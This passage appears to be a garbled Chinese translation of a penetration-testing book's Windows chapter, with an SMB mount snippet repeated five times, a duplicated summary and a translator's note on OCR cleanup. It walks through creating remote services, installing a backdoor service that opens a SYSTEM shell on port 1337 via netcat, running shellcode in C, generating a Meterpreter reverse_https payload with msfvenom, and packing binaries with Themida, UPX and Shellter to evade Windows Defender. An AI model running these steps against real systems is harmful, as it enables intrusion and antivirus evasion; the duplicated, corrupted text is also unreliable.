
了解你可以如何使用 `SMBClient`。

```
mount -t cifs \\\\Target\$ /mnt/data -o user=backup,vers=1.0
mount -t cifs \\\192.168.56.104 /mnt/data -o user=backup,vers=1.0
```

了解你可以如何使用 `SMBClient`。

```
mount -t cifs \\\\Target\$ /mnt/data -o user=backup,vers=1.0
mount -t cifs \\\192.168.56.104 /mnt/data -o user=backup,vers=1.0
```

了解你可以如何使用 `SMBClient`。

```
mount -t cifs \\\\Target\$ /mnt/data -o user=backup,vers=1.0
mount -t cifs \\\192.168.56.104 /mnt/data -o user=backup,vers=1.0
```

了解你可以如何使用 `SMBClient`。

```
mount -t cifs \\\\Target\$ /mnt/data -o user=backup,vers=1.0
mount -t cifs \\\192.168.56.104 /mnt/data -o user=backup,vers=1.0
```

了解你可以如何使用 `SMBClient`。

```
mount -t cifs using\\Target\$ /mnt/data -o user=backup,vers=1.0
mount -t cifs \\\192.168.56.104 /mnt/data -o user=backup,vers=1.0
```

（注：原始 OCR 文本包含大量的重复和乱码段。我根据提供的代码片段清理了逻辑流。）

`sc enumdepend <Service>` - 列出服务依赖

`sc \ip> create <service> binpath=c:\blah.exe start=auto` 创建远程服务

你可以通过 `binpath` 创建并执行服务。为了最大限度地利用服务进行权限提升，你必须编写一个实际的服务与控制器通信。然而，微软提供了许多可以轻松修改的示例。Hacker House 提供了一个 SYSTEM 服务项目（`github.com/hackerhouse-opensource/backdoors/blob/master/SYSTEMservice.tg`），它绑定到本地的 `1337` 端口，允许你轻松地使用该端口打开 SYSTEM 权限。你可以使用 Visual Studio Community 根据自己的需求对其进行轻松编辑，由于它是编译后的代码，你需要确保目标系统已安装了适用于 Visual Studio 2015、2017 和 2019 的 Microsoft C++ Redistributable。它包含 `CppWindowsService.exe`，当使用以下选项运行时，它将创建一个简单的服务。记住在完成后使用 `-remove` 卸载该服务！

```
.CppWindowsService.exe -install
```

`CppWindowsService` 已安装。

```
net start CppWindowsService
```

`CppWindowsService` 示例服务正在启动。

`CppWindowsService` 示例服务已启动。

```
C:\tools\Windows_Tradecraft_Tools\netcat\nc.exe 127.0.0.1 1337
```

Microsoft Windows [Version 6.3.9600]

(c) 2013 Microsoft Corporation. 保留所有。

```
C:\WINDOWS\system32>
```

```
whoami
nt authority\system
```

# 第 13 章 Microsoft Windows

```c
pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(pShellcode, shellcode, sizeof(shellcode)-1);
int (*func)();
func = (int (*)())pShellcode;
(*func)();
```

如果你生成一个包含易于检测的 Windows shellcode 的 `Payload.dll` 文件（作为一个完全未编码或未加密的负载），那么 Windows Defender 将会将你的 DLL 识别为恶意并隔离该文件。因此，你必须对从 DLL 加载的 shellcode 进行编码或加密，以确保它绕过基于签名的检测。Metasploit 支持通过提供 `--encrypt` 选项使用 `MSFvenom` 生成负载。这允许你创建一个使用 RC4、AES256 或 Base64 或 XOR 加密的负载。仅仅对你的负载进行编码是不够的，使用 MSFvenom 内置的 `x86/xor_dynamic` 编码器能够生成无签名的 DLL。可以使用以下 MSFvenom 命令为你生成供你编译成 DLL 的负载：

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=<172.16.10.2> PORT=443 --encoder x86/xor_dynamic -f c -o payload.c
```

然后你应该替换 `Payload.c` 中 `buf` 条目中的 shell 变量。你需要使用 Visual Studio 编译项目文件，通常点击 Build 菜单中的 Build，它将为你编译出一个供你使用的 exe 文件。

Windows Defender 将可疑样本发送到 Windows Defender 反病毒服务进行检测，且你创建的任何生成文件寿命都是的，特别是当你使用 Meterpreter 的高级功能时。调整技术添加加密，或使用计时器强制超时，可以防止这种情况。你还可以使用虚拟机加壳工具如 `Themida`、`UPX32` 以及二进制注入工具 `Shelter`。这些过程中的每一个都会混淆你的二进制文件功能，并帮助你规避检测程序。你甚至可以运行多个过程，创建一个使用 `UPX32` 压缩并使用像 `Themida` 等基于虚拟机的保护工具保护的 `Shellter` 二进制文件。你需要通过反复尝试经历这个过程，直到创建一个不被检测到的负载。

最终，你不应该期望使用此处示例项目生成的任何负载能够持久——如果你成功了，它也将是临时且短暂的。相反，请将此项目作为起点，使用你自己的方法将 Meterpreter 加载到受 Windows Defender 保护的主机。这种熟练规避安全产品的方法需要学习 C++ 或汇编等语言的底层编程。然而，如果这听起来是一项艰的任务，你可以使用商业加壳软件创建规避检测的二进制文件。

![](img/1d31ce8edaa3c89a05c75788a5b4364c_536_0.png)

图 13.9: `Themida` - 一个虚拟机加壳工具。

# 总结

Windows 通常组织为森林，其中包含域树。域控制器是负责每个域的主机，并由域管理员账户管理。单个域管理森林中的其他域。拥有 Windows 域的最终目标是获取对管理其余部分的域控制器的访问。在 Windows 黑客攻击中，域管理员账户是最重要的用户。用户通常由运行在域上的称为 Active Directory (`AD`) 的集中化服务进行验证。

在攻击 Windows 系统时，你应该应用从黑客攻击类 Unix 系统时学到的技术。扫描并探测主机以获取信息，识别有漏洞的服务，然后寻找这些漏洞。记住，微软提供了软件的评估版本（包括 Windows Server），你应该建立自己的实验室来练习 Windows 黑客攻击。

反病毒软件（特别是 Windows Defender）在防御 Windows 系统免受各种攻击方面起着重要作用，而不仅仅是传统的计算机病毒。对于渗透测试而言，学习绕过此类软件检测的技术是无价之的。最新的 Windows 系统可能很难进入，你可能需要开发自己的利用程序来绕过 Windows Defender。这是一项高级技能，所以如果这是你目前的水平，请不要灰馁。你不需要自己编写漏洞反混淆工具，可以使用现有工具对代码反混淆。

在攻击 Windows 系统时，你应该应用从黑客攻击类 Unix 系统时学到的技术。扫描并探测主机以获取信息，识别有漏洞的服务，然后寻找这些漏洞。记住，微软提供了软件的评估版本（包括 Windows Server），你应该建立自己的实验室来练习 Windows 黑客攻击。
